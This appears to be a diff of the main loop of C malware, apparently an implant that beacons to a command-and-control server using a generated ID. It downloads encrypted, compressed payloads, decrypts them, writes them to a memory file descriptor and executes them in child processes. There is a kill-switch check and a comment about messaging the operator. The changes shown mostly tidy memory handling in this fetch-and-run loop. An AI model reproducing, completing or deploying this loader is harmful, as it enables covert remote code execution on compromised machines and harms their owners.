@@ -33,77 +33,62 @@ int main()
     char *formattedURL;
     char **payloadNames;
     char *currLine;
+    char **currLines;
     size_t numPayloads;
     size_t numLines;
     size_t currLineNum = 0;
+    int beaconCount = 0;
     
     char *uid = genUID();
     if (uid == NULL)
         return -1;
 
-    // formattedURL = formatURL("instructions", uid);
-    // if (formattedURL == NULL)
-    //     return -1;
-    
-    // payload = beacon(formattedURL, 1);
-    // if ( payload.memory == NULL)
-    //     return -1;
-
-    // payloadOffset = (unsigned char *)payload.memory;
-    // payloadMeta = parseMeta(&payloadOffset);
-
-    // // password padding
-    // psswd = psswdPadding(psswd);
-    // if (psswd == NULL)
-    // {
-    //     free(payload.memory);
-    //     free(payloadMeta);
-    //     free(formattedURL);
-    //     return -1;
-    // }
-    // decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[0].encryptedLength, payloadMeta[0].decryptedLength, psswd);
-    // decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[0].uncompressedLength, payloadMeta[0].decryptedLength);
-
-    // numLines = countLines(decompressed);
-    // currLine = parsePayloads(decompressed, numLines, ";")[0];
-
-    // free(decompressed);
-    // free(payload.memory);
-    // free(formattedURL);
+    // password padding
+    psswd = psswdPadding(psswd);
+    if (psswd == NULL)
+    {
+        free(uid);
+        return -1;
+    }
 
     while(1)
     {
-        // Sorry for repeated code, no time to refactor
         formattedURL = formatURL("instructions", uid);
         if (formattedURL == NULL)
+        {
+            free(uid);
+            free(psswd);
             return -1;
-        
-        payload = beacon(formattedURL, 2);
+        }
+        if (beaconCount == 0)
+        {
+            payload = beacon(formattedURL, 1);
+        }
+        else
+        {
+            payload = beacon(formattedURL, 2);
+        }
         if ( payload.memory == NULL)
+        {
+            free(uid);
+            free(formattedURL);
+            free(psswd);
             return -1;
-
+        }
         payloadOffset = (unsigned char *)payload.memory;
         payloadMeta = parseMeta(&payloadOffset);
 
-        // password padding
-        psswd = psswdPadding(psswd);
-        if (psswd == NULL)
-        {
-            free(payload.memory);
-            free(payloadMeta);
-            free(formattedURL);
-            return -1;
-        }
         decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[0].encryptedLength, payloadMeta[0].decryptedLength, psswd);
         decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[0].uncompressedLength, payloadMeta[0].decryptedLength);
         
         numLines = countLines(decompressed);
-        currLine = parsePayloads(decompressed, numLines, ";")[currLineNum];
+        currLines = parsePayloads(decompressed, numLines, ";");
+        currLine = currLines[currLineNum];
 
         free(decompressed);
         free(payload.memory);
         free(formattedURL);
-        // End repeated code
+        freePayloadMeta(payloadMeta);
 
         numPayloads = countPayloads(currLine);
         payloadNames = parsePayloads(currLine, numPayloads, " ");
@@ -111,6 +96,8 @@ int main()
         if (!strcmp(payloadNames[0], "reset"))
         {
             currLineNum = 0;
+            freePayloads(payloadNames, numPayloads);
+            freePayloads(currLines, numLines);
             continue;
         }
 
@@ -119,19 +106,35 @@ int main()
             //loop for every payload to get in payloadNames
             formattedURL = formatURL(payloadNames[j], uid);
             if (formattedURL == NULL)
+            {
+                freePayloads(currLines, numLines);
+                freePayloads(payloadNames, numPayloads);
+                free(formattedURL);
+                free(uid);
                 return -1;
-            
+            }
+
             payload = beacon(formattedURL, 0);
-            if ( payload.memory == NULL)
+            if (payload.memory == NULL)
+            {
+                freePayloads(currLines, numLines);
+                freePayloads(payloadNames, numPayloads);
+                free(formattedURL);
+                free(uid);
                 return -1;
+            }
 
             payloadOffset = (unsigned char *)payload.memory; // hold for iteration
             numBlobs = extractInt(payloadOffset);
 
             payloadMeta = parseMeta(&payloadOffset); // extract all metadata
-            if(payloadMeta == NULL){
+            if (payloadMeta == NULL)
+            {
+                freePayloads(currLines, numLines);
+                freePayloads(payloadNames, numPayloads);
                 free(payload.memory);
                 free(formattedURL);
+                free(uid);
                 return -1;
             }
 
@@ -141,9 +144,13 @@ int main()
                 decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[i].encryptedLength, payloadMeta[i].decryptedLength, psswd);
                 if (decrypted == NULL)
                 {
+                    freePayloads(currLines, numLines);
+                    freePayloads(payloadNames, numPayloads);
+                    freePayloadMeta(payloadMeta);
                     free(payload.memory);
-                    free(payloadMeta);
                     free(formattedURL);
+                    free(psswd);
+                    free(uid);
                     return -1;
                 }
 
@@ -151,6 +158,14 @@ int main()
 
                 if ((payloadMeta[i].uncompressedLength == 64) && (checkKill(decompressed) == 1))
                 {
+                    freePayloads(currLines, numLines);
+                    freePayloads(payloadNames, numPayloads);
+                    freePayloadMeta(payloadMeta);
+                    free(payload.memory);
+                    free(formattedURL);
+                    free(psswd);
+                    free(decompressed);
+                    free(uid);
                     return -1;
                 }
 
@@ -163,12 +178,14 @@ int main()
                 writeReturnSize = write(payloadFD, decompressed, payloadMeta[i].uncompressedLength); // write to mem_fd and error check
                 if (writeReturnSize != payloadMeta[i].uncompressedLength)
                 {
-                    free(decompressed);
+                    freePayloads(currLines, numLines);
+                    freePayloads(payloadNames, numPayloads);
+                    freePayloadMeta(payloadMeta);
                     free(payload.memory);
-                    free(payloadMeta);
-                    free(psswd);
-                    close(payloadFD);
                     free(formattedURL);
+                    free(psswd);
+                    free(decompressed);
+                    free(uid);
                     return -1;
                 }
                 
@@ -181,12 +198,14 @@ int main()
                         if (executePayload(payloadFD, payloadMeta[i].argv, payloadMeta[i].envp) == 0) // execute within child
                         {
                             //send message to operator
-                            free(decompressed);
+                            freePayloads(currLines, numLines);
+                            freePayloads(payloadNames, numPayloads);
+                            freePayloadMeta(payloadMeta);
                             free(payload.memory);
-                            free(payloadMeta);
-                            free(psswd);
-                            close(payloadFD);
                             free(formattedURL);
+                            free(psswd);
+                            free(decompressed);
+                            free(uid);
                             return -1;
                         }
                     }
@@ -208,10 +227,14 @@ int main()
                 payloadOffset += payloadMeta[i].encryptedLength; // increment offset to point at next payload
             }
             free(payload.memory);
-            free(payloadMeta);
+            freePayloadMeta(payloadMeta);
             free(formattedURL);
         }
         currLineNum++;
+        beaconCount++;
+        freePayloads(currLines, numLines);
+        freePayloads(payloadNames, numPayloads);
     }
+    free(uid);
     return 0;
 }
